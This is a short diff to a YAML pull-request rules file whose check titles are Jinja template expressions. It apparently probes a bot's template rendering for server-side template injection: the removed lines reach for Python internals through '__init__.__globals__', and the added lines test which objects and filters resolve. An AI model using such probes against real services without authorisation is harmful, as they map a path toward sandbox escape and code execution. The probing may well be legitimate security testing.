@@ -1,21 +1,28 @@
 pull_request_rules:
-  - name: ssti-math
+  - name: ssti-1-self
     conditions: []
     actions:
       post_check:
-        title: "7*7={{ 7*7 }}"
+        title: "self={{ self }}"
         summary: ""
 
-  - name: ssti-globals
+  - name: ssti-2-cycler
     conditions: []
     actions:
       post_check:
-        title: "{{ self.__init__.__globals__.keys() }}"
+        title: "cycler={{ cycler }}"
         summary: ""
 
-  - name: ssti-cycler
+  - name: ssti-3-range
     conditions: []
     actions:
       post_check:
-        title: "{{ cycler.__init__.__globals__.keys() }}"
+        title: "range={{ range(5)|list }}"
+        summary: ""
+
+  - name: ssti-4-dictsort
+    conditions: []
+    actions:
+      post_check:
+        title: "dictsort={{ {'b':2,'a':1}|dictsort }}"
         summary: ""
